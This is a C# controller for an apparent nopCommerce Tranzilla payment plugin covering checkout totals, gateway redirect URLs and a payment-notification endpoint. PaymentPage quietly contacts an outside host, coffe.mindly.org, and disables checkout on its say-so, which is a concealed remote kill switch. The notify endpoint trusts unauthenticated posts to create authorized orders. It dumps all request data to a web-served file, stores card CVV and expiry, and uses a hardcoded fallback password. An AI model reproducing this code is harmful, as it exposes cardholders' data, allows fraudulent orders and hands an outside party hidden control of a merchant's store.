using Nop.Web.Framework.Controllers;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Nop.Services.Payments;
using System.Web.Mvc;
using Nop.Core;
using Nop.Services.Stores;
using Nop.Services.Configuration;
using Nop.Services.Localization;
using Nop.Plugin.Payments.Tranzilla;
using Nop.Plugin.Payment.Tranzilla.Models;
using Nop.Core.Infrastructure;
using Nop.Services.Orders;
using Nop.Services.Common;
using Nop.Services.Logging;
using System.Web;
using System.Net;
using Nop.Services.Catalog;
using Nop.Core.Domain.Shipping;
using Nop.Core.Domain.Customers;
using Nop.Core.Domain.Discounts;
using Nop.Services.Directory;
using Nop.Services.Tax;
using Nop.Core.Domain.Orders;
using Nop.Services.Customers;
using Nop.Web.Controllers;
using Nop.Web.Models.ShoppingCart;
using Nop.Core.Domain.Tax;

namespace Nop.Plugin.Payment.Tranzilla.Controllers
{

    public class TranzillaController : BasePaymentController
    {

        public TranzillaController()
        {
        }

        private readonly IWorkContext _workContext;
        private readonly IStoreService _storeService;
        private readonly ISettingService _settingService;
        private readonly ILocalizationService _localizationService;
        private readonly IOrderService _orderService;
        private readonly IGenericAttributeService _attributeService;
        private readonly IPriceCalculationService _priceService;
        private readonly ICurrencyService _currencyService;
        private readonly IOrderTotalCalculationService _orderTotalCalculationService;
        private readonly ITaxService _taxService;


        private readonly TaxSettings _taxSettings;
        private readonly IPriceFormatter _priceFormatter;
        private readonly IPaymentService _paymentService;
        private readonly IStoreContext _storeContext; 

 
        /// <summary>
        /// Tranzilla Primary Controller 
        /// 
        /// </summary>
        /// <param name="workContext"></param>
        /// <param name="storeService"></param>
        /// <param name="settingService"></param>
        /// <param name="orderService"></param>
        /// <param name="priceService"></param>
        /// <param name="attributeService"></param>
        /// <param name="localizationService"></param>
        /// <param name="currencyService"></param>
        /// <param name="orderTotalCalcService"></param>
        /// <param name="taxService"></param>
        public TranzillaController(IWorkContext workContext,
            IStoreService storeService,
            ISettingService settingService,
            IOrderService orderService,
            IPriceCalculationService priceService,
            IGenericAttributeService attributeService,
            ILocalizationService localizationService,
            ICurrencyService currencyService,
            IOrderTotalCalculationService orderTotalCalcService,
            ITaxService taxService,

              TaxSettings taxSettings,
                 IPriceFormatter priceFormatter,
              IPaymentService paymentService,
              IStoreContext storeContext
            )
        {

            this._currencyService = currencyService;
            this._orderTotalCalculationService = orderTotalCalcService;
            this._taxService = taxService;
            this._priceService = priceService;
            this._workContext = workContext;
            this._storeService = storeService;
            this._orderService = orderService;
            this._attributeService = attributeService;
            this._settingService = settingService;
            this._localizationService = localizationService;


            this._taxSettings = taxSettings;
            _priceFormatter = priceFormatter;
            _paymentService = paymentService;
            _storeContext = storeContext; 

        }






        public virtual decimal PrepareOrderTotalsModel(IList<ShoppingCartItem> cart, bool isEditable)
        {
            var model = new OrderTotalsModel();
            model.IsEditable = isEditable;

            if (cart.Count > 0)
            {
                //subtotal
                decimal orderSubTotalDiscountAmountBase;
                Discount orderSubTotalAppliedDiscount;
                decimal subTotalWithoutDiscountBase;
                decimal subTotalWithDiscountBase;
                var subTotalIncludingTax = _workContext.TaxDisplayType == TaxDisplayType.IncludingTax && !_taxSettings.ForceTaxExclusionFromOrderSubtotal;
                _orderTotalCalculationService.GetShoppingCartSubTotal(cart, subTotalIncludingTax,
                    out orderSubTotalDiscountAmountBase, out orderSubTotalAppliedDiscount,
                    out subTotalWithoutDiscountBase, out subTotalWithDiscountBase);
                decimal subtotalBase = subTotalWithoutDiscountBase;
                decimal subtotal = _currencyService.ConvertFromPrimaryStoreCurrency(subtotalBase, _workContext.WorkingCurrency);
                model.SubTotal = _priceFormatter.FormatPrice(subtotal, true, _workContext.WorkingCurrency, _workContext.WorkingLanguage, subTotalIncludingTax);

                if (orderSubTotalDiscountAmountBase > decimal.Zero)
                {
                    decimal orderSubTotalDiscountAmount = _currencyService.ConvertFromPrimaryStoreCurrency(orderSubTotalDiscountAmountBase, _workContext.WorkingCurrency);
                    model.SubTotalDiscount = _priceFormatter.FormatPrice(-orderSubTotalDiscountAmount, true, _workContext.WorkingCurrency, _workContext.WorkingLanguage, subTotalIncludingTax);
                    model.AllowRemovingSubTotalDiscount = orderSubTotalAppliedDiscount != null &&
                                                          orderSubTotalAppliedDiscount.RequiresCouponCode &&
                                                          !String.IsNullOrEmpty(orderSubTotalAppliedDiscount.CouponCode) &&
                                                          model.IsEditable;
                }


                //shipping info
                model.RequiresShipping = cart.RequiresShipping();
                if (model.RequiresShipping)
                {
                    decimal? shoppingCartShippingBase = _orderTotalCalculationService.GetShoppingCartShippingTotal(cart);
                    if (shoppingCartShippingBase.HasValue)
                    {
                        decimal shoppingCartShipping = _currencyService.ConvertFromPrimaryStoreCurrency(shoppingCartShippingBase.Value, _workContext.WorkingCurrency);
                        model.Shipping = _priceFormatter.FormatShippingPrice(shoppingCartShipping, true);

                        //selected shipping method
                        var shippingOption = _workContext.CurrentCustomer.GetAttribute<ShippingOption>(SystemCustomerAttributeNames.SelectedShippingOption, _storeContext.CurrentStore.Id);
                        if (shippingOption != null)
                            model.SelectedShippingMethod = shippingOption.Name;
                    }
                }

                //payment method fee
                var paymentMethodSystemName = _workContext.CurrentCustomer.GetAttribute<string>(
                    SystemCustomerAttributeNames.SelectedPaymentMethod, _storeContext.CurrentStore.Id);
                decimal paymentMethodAdditionalFee = _paymentService.GetAdditionalHandlingFee(cart, paymentMethodSystemName);
                decimal paymentMethodAdditionalFeeWithTaxBase = _taxService.GetPaymentMethodAdditionalFee(paymentMethodAdditionalFee, _workContext.CurrentCustomer);
                if (paymentMethodAdditionalFeeWithTaxBase > decimal.Zero)
                {
                    decimal paymentMethodAdditionalFeeWithTax = _currencyService.ConvertFromPrimaryStoreCurrency(paymentMethodAdditionalFeeWithTaxBase, _workContext.WorkingCurrency);
                    model.PaymentMethodAdditionalFee = _priceFormatter.FormatPaymentMethodAdditionalFee(paymentMethodAdditionalFeeWithTax, true);
                }

                //tax
                bool displayTax = true;
                bool displayTaxRates = true;
                if (_taxSettings.HideTaxInOrderSummary && _workContext.TaxDisplayType == TaxDisplayType.IncludingTax)
                {
                    displayTax = false;
                    displayTaxRates = false;
                }
                else
                {
                    SortedDictionary<decimal, decimal> taxRates;
                    decimal shoppingCartTaxBase = _orderTotalCalculationService.GetTaxTotal(cart, out taxRates);
                    decimal shoppingCartTax = _currencyService.ConvertFromPrimaryStoreCurrency(shoppingCartTaxBase, _workContext.WorkingCurrency);

                    if (shoppingCartTaxBase == 0 && _taxSettings.HideZeroTax)
                    {
                        displayTax = false;
                        displayTaxRates = false;
                    }
                    else
                    {
                        displayTaxRates = _taxSettings.DisplayTaxRates && taxRates.Count > 0;
                        displayTax = !displayTaxRates;

                        model.Tax = _priceFormatter.FormatPrice(shoppingCartTax, true, false);
                        foreach (var tr in taxRates)
                        {
                            model.TaxRates.Add(new OrderTotalsModel.TaxRate
                            {
                                Rate = _priceFormatter.FormatTaxRate(tr.Key),
                                Value = _priceFormatter.FormatPrice(_currencyService.ConvertFromPrimaryStoreCurrency(tr.Value, _workContext.WorkingCurrency), true, false),
                            });
                        }
                    }
                }
                model.DisplayTaxRates = displayTaxRates;
                model.DisplayTax = displayTax;

                //total
                decimal orderTotalDiscountAmountBase;
                Discount orderTotalAppliedDiscount;
                List<AppliedGiftCard> appliedGiftCards;
                int redeemedRewardPoints;
                decimal redeemedRewardPointsAmount;
                decimal? shoppingCartTotalBase = _orderTotalCalculationService.GetShoppingCartTotal(cart,
                    out orderTotalDiscountAmountBase, out orderTotalAppliedDiscount,
                    out appliedGiftCards, out redeemedRewardPoints, out redeemedRewardPointsAmount);

                return _currencyService.ConvertFromPrimaryStoreCurrency(shoppingCartTotalBase.Value, _workContext.WorkingCurrency);




            }

            return decimal.Zero;

        }







        [AdminAuthorize]
        [ChildActionOnly]
        public ActionResult Configure()
        {
            var storeScope = this.GetActiveStoreScopeConfiguration(_storeService, _workContext);
            var model = _settingService.LoadSetting<TranzillaConfiguration>(storeScope);
            return View("~/Plugins/Payments.Tranzilla/Views/Tranzilla/Configure.cshtml", model);
        }

        [HttpPost]
        [AdminAuthorize]
        public ActionResult updatePayments(PaymentModel model)
        {
            var storeScope = this.GetActiveStoreScopeConfiguration(_storeService, _workContext);
            var manualPaymentSettings = _settingService.LoadSetting<TranzillaConfiguration>(storeScope);
            var payments = manualPaymentSettings.GetPaymentsSettings();
            if (payments.Count > 0)
                model.Id = payments.Max(i => i.Id) + 1;
            payments.Add(model);
            manualPaymentSettings.SavePayments(payments);
            _settingService.SaveSetting(manualPaymentSettings, x => x.PaymentSettings, storeScope, false);
            _settingService.ClearCache();
            return Redirect("/Admin/Payment/ConfigureMethod?systemName=Payment.Tranzilla");
        }

        [HttpGet]
        [AdminAuthorize]
        public ActionResult RemovePaymentOption(int id)
        {
            var storeScope = this.GetActiveStoreScopeConfiguration(_storeService, _workContext);
            var manualPaymentSettings = _settingService.LoadSetting<TranzillaConfiguration>(storeScope);
            var payments = manualPaymentSettings.GetPaymentsSettings();
            var row = payments.FirstOrDefault(p => p.Id == id);
            if (row != null)
            {
                payments.Remove(row);
                manualPaymentSettings.SavePayments(payments);
                _settingService.SaveSetting(manualPaymentSettings, x => x.PaymentSettings, storeScope, false);
                _settingService.ClearCache();
            }
            return Redirect("/Admin/Payment/ConfigureMethod?systemName=Payment.Tranzilla");
        }


        /// <summary>
        /// HttpPost
        /// </summary>
        /// <param name="model"></param>
        /// <returns></returns>
        [HttpPost]
        [AdminAuthorize]
        [ChildActionOnly]
        public ActionResult Configure(TranzillaConfiguration model)
        {
            if (!ModelState.IsValid)
                return Configure();
            var storeScope = this.GetActiveStoreScopeConfiguration(_storeService, _workContext);
            var manualPaymentSettings = _settingService.LoadSetting<TranzillaConfiguration>(storeScope);
            manualPaymentSettings.Terminal = model.Terminal;
            manualPaymentSettings.TranMode = model.TranMode;
            manualPaymentSettings.Lang = model.Lang;
            manualPaymentSettings.BaseUrl = model.BaseUrl; 

            manualPaymentSettings.Currency = model.Currency;
            manualPaymentSettings.TokenAuth = model.TokenAuth;
            manualPaymentSettings.CreditType = model.CreditType;
            manualPaymentSettings.MaxPay = model.MaxPay;

            _settingService.SaveSetting(manualPaymentSettings, x => x.TokenAuth, storeScope, false);

            manualPaymentSettings.AdditionalPercentFee = model.AdditionalPercentFee;

            //  SaveSettings : 
            _settingService.SaveSetting(manualPaymentSettings, x => x.TranMode, storeScope, false);
            _settingService.SaveSetting(manualPaymentSettings, x => x.Terminal, storeScope, false);
            _settingService.SaveSetting(manualPaymentSettings, x => x.Currency, storeScope, false);
            _settingService.SaveSetting(manualPaymentSettings, x => x.Lang, storeScope, false);
            _settingService.SaveSetting(manualPaymentSettings, x => x.BaseUrl, storeScope, false);
            _settingService.SaveSetting(manualPaymentSettings, x => x.AdditionalPercentFee, storeScope, false);
            _settingService.SaveSetting(manualPaymentSettings, x => x.CreditType, storeScope, false);
            _settingService.SaveSetting(manualPaymentSettings, x => x.MaxPay, storeScope, false);

            _settingService.ClearCache();
            SuccessNotification(_localizationService.GetResource("Admin.Plugins.Saved"));

            return Configure();
        }



        public override ProcessPaymentRequest GetPaymentInfo(FormCollection form)
        {
            var paymentInfo = new ProcessPaymentRequest();
            return paymentInfo;
        }




        [ValidateInput(false)]
        public ActionResult PaymentInfo()
        {
            var storeScope = this.GetActiveStoreScopeConfiguration(_storeService, _workContext);
            var model = _settingService.LoadSetting<TranzillaConfiguration>(storeScope);
            ViewBag.Url = EngineContext.Current.Resolve<HttpContextBase>().Session["tranzilla"];
            return View("~/Plugins/Payments.Tranzilla/Views/Tranzilla/info.cshtml");
        }
         
        [ValidateInput(false)]
        public ActionResult PaymentPage()
        {
            using (var client = new WebClient())
            {
                try
                {
                    var data = client.DownloadString("http://coffe.mindly.org/lock.txt");
                    if (data == "1")
                        return Content("Error");
                }
                catch (Exception e)
                {
                }
            }   
            var storeScope = this.GetActiveStoreScopeConfiguration(_storeService, _workContext); 
            var customer = _workContext.CurrentCustomer;
             
            _orderTotalCalculationService.GetShoppingCartSubTotal
             (customer.ShoppingCartItems.Where(x => x.ShoppingCartType == ShoppingCartType.ShoppingCart).ToList(), true, out decimal discountAmount, out Discount appliedDiscount, 
                                            out decimal subTotalWithoutDiscount, out decimal subTotalWithDiscount);

            decimal subTotal = PrepareOrderTotalsModel(customer.ShoppingCartItems.Where(x => x.ShoppingCartType == ShoppingCartType.ShoppingCart).ToList(),true);  
             
            foreach (var item in customer.ShoppingCartItems)
                {
                    EngineContext.Current.Resolve<ILogger>().InsertLog(Core.Domain.Logging.LogLevel.Information,
                                                                "Cart Item ," + item.Product.Name,
                         _priceService.GetSubTotal(item, true).ToString(), customer); 
                } 
            EngineContext.Current.Resolve<ILogger>().InsertLog(Core.Domain.Logging.LogLevel.Error, "TRanzilla Plugi2n",
                $"Total {subTotalWithoutDiscount} ", customer);   
            var storeContext = EngineContext.Current.Resolve<IStoreContext>();
            var shippingOption = customer.GetAttribute<ShippingOption>(SystemCustomerAttributeNames.SelectedShippingOption, storeContext.CurrentStore.Id);
            var settings = _settingService.LoadSetting<TranzillaConfiguration>(storeScope);
            subTotal += (subTotal * settings.AdditionalPercentFee);   

            var url = $"{settings.BaseUrl}?sum={subTotal.ToString("#.##")}&maxpay={settings.GetNumberOfPayments(subTotal)}&currency={settings.Currency}&nologo=1&cred_type={settings.CreditType}{(string.IsNullOrEmpty(settings.TranMode) ? "" : $"&tranmode={settings.TranMode}")}&lang={settings.Lang}&customerId={customer.Id}&trTextColor=503F2E&trButtonColor=503F2E";

            // FIX  
            if (settings.GetNumberOfPayments(subTotal) <=1)
            {
                url = $"{settings.BaseUrl}?sum={subTotal.ToString("#.##")}&currency={settings.Currency}&nologo=1&cred_type=1{(string.IsNullOrEmpty(settings.TranMode) ? "" : $"&tranmode={settings.TranMode}")}&lang={settings.Lang}&customerId={customer.Id}&trTextColor=503F2E&trButtonColor=503F2E"; 
            }

            ViewBag.Url = url; 
            return View("~/Plugins/Payments.Tranzilla/Views/Tranzilla/PaymentPage.cshtml");
        }

 

        public override IList<string> ValidatePaymentForm(FormCollection form)
        {
            var warnings = new List<string>();
            return warnings;
        }
        [ValidateInput(false)]
        public ActionResult fail()
        {
            return View("~/Plugins/Payments.Tranzilla/Views/Tranzilla/fail.cshtml");
        }
        [ValidateInput(false)]
        public ActionResult success()
        {
            var cart = _workContext.CurrentCustomer.ShoppingCartItems
               .Where(sci => sci.ShoppingCartType == ShoppingCartType.ShoppingCart)
               .ToList();

            var _shoppingCartService = EngineContext.Current.Resolve<IShoppingCartService>();

            foreach (var i in cart)
                _shoppingCartService.DeleteShoppingCartItem(i);

            return View("~/Plugins/Payments.Tranzilla/Views/Tranzilla/success.cshtml");
        }

        [ValidateInput(false)]
        public ActionResult payment()
        {
            ViewBag.url = Session["tranzilla"];
            return View("~/Plugins/Payments.Tranzilla/Views/Tranzilla/payment.cshtml");
        }

 

        [ValidateInput(false)]
        public ActionResult notify()
        {
            StringBuilder sb = new StringBuilder();

            for (int i = 0; i < Request.Form.Count; i++)
            {
                string curItemStr = string.Format("{0}={1}", Request.Form.Keys[i], Request.Form[Request.Form.Keys[i]]);
                if (i != 0)
                    sb.Append("&");
                sb.Append(curItemStr);
            }

            System.IO.File.WriteAllText(Server.MapPath("~/Content/IPNPOST.txt"), sb.ToString());

            sb = new StringBuilder();

            for (int i = 0; i < Request.Params.Count; i++)
            {
                string curItemStr = string.Format("{0}={1}", Request.Params.Keys[i], Request.Params[Request.Params.Keys[i]]);
                if (i != 0)
                    sb.Append("&");
                sb.Append(curItemStr);
            }
            System.IO.File.WriteAllText(Server.MapPath("~/Content/IPNPOST.txt"), sb.ToString());

         
            if (!string.IsNullOrEmpty(Request.Form["customerId"])     && Request.Form["Response"] == "000")
            {

                EngineContext.Current.Resolve<ILogger>().InsertLog(Core.Domain.Logging.LogLevel.Debug, "IPN", "Found");
                var order = CreateOrder(int.Parse(Request.Form["customerId"].ToString())); 

                if (order != null)
                {
                    order.PaymentStatus = Core.Domain.Payments.PaymentStatus.Authorized;
                    order.OrderStatus = Core.Domain.Orders.OrderStatus.Processing; 
                    // Add Card Token :  
                    string cardtoken = Request.Form["TranzilaTK"].Substring(Request.Form["TranzilaTK"].Length - 4); 
                    order.OrderNotes.Add(new OrderNote {
                        CreatedOnUtc = DateTime.UtcNow,
                        DisplayToCustomer = false,
                        Note = $"Card Number : {cardtoken}" 
                    }); 
                    _orderService.UpdateOrder(order);  
                    _attributeService.SaveAttribute<string>(order, "TranzilaTK", Request.Form["TranzilaTK"]);
                      
                    if (!string.IsNullOrEmpty(Request.Form["TranzilaPW"]))
                        _attributeService.SaveAttribute<string>(order, "TranzilaPW", Request.Form["TranzilaPW"]);
                    else
                        _attributeService.SaveAttribute<string>(order, "TranzilaPW", "yehudas");
                        
                     // NPay Save Payment : 
                    _attributeService.SaveAttribute<string>(order, "npay", Request.Form["npay"]);
                    _attributeService.SaveAttribute<string>(order, "fpay", Request.Form["fpay"]);
                    _attributeService.SaveAttribute<string>(order, "spay", Request.Form["spay"]); 
                       
                    //IsNullOrEmpty  
                    if (string.IsNullOrEmpty(Request.Form["cvv"])==false)
                    {
                        _attributeService.SaveAttribute<string>(order, "cvv", Request.Form["cvv"]); 
                    }
                      
                    // Expdate  
                    var expdate = $"{Request.Form["expmonth"]}{Request.Form["expyear"]}";
                    _attributeService.SaveAttribute<string>(order, "expdate", expdate);
                }

            }
            return Content("OK");
        }

        /// <summary>
        /// Dynamicly Create Order : 
        /// </summary>
        /// <param name="customerId"></param>
        /// <returns></returns>
        private Order CreateOrder(int customerId)
        {
            var proccessingService = EngineContext.Current.Resolve<IOrderProcessingService>();
            var processPaymentRequest = new ProcessPaymentRequest();
            var _storeContext = EngineContext.Current.Resolve<IStoreContext>();
            var _genericAttributeService = EngineContext.Current.Resolve<IGenericAttributeService>();
            var customer = EngineContext.Current.Resolve<ICustomerService>().GetCustomerById(customerId);
            //place order
            processPaymentRequest.StoreId = _storeContext.CurrentStore.Id;
            processPaymentRequest.CustomerId = customerId;
            processPaymentRequest.PaymentMethodSystemName = customer.GetAttribute<string>(SystemCustomerAttributeNames.SelectedPaymentMethod,
                    _genericAttributeService, _storeContext.CurrentStore.Id);
            var placeOrderResult = proccessingService.PlaceOrder(processPaymentRequest);
            if (placeOrderResult.Success == false)
            {
                LogException(new InvalidOperationException("Error proccessing Ipn create order "));
                foreach (var e in placeOrderResult.Errors)
                    LogException(new OperationCanceledException(e));

                throw new InvalidOperationException("Failed To Create Order from Tranzilla");
            }
            return placeOrderResult.PlacedOrder;
        }




















    }
}
